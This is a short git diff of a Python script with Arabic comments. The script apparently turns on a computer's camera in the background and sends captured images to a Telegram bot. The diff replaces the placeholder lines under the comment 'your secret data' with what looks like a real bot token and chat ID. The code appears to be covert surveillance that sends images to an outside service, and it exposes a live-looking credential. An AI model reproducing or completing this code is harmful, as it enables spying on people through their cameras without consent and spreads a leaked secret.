@@ -4,8 +4,8 @@ import time
 import os
 
 # --- بياناتك السرية ---
-TOKEN = "هنا_ضع_التوكن_الذي_أعطاك_إياه_BotFather"
-CHAT_ID = "هنا_ضع_الرقم_الذي_أعطاك_إياه_userinfobot"
+TOKEN = "8622793927:AAGTEaVOusAzcy_CG58TD5ZEl8VuqnMosiQr"
+CHAT_ID = "6284670726"
 
 def capture_and_send():
     # 1. تشغيل الكاميرا في الخلفية
@@ -45,4 +45,5 @@ def capture_and_send():
         print("لم يتمكن البرنامج من فتح الكاميرا.")
 
 # تشغيل الدالة
+
 capture_and_send()
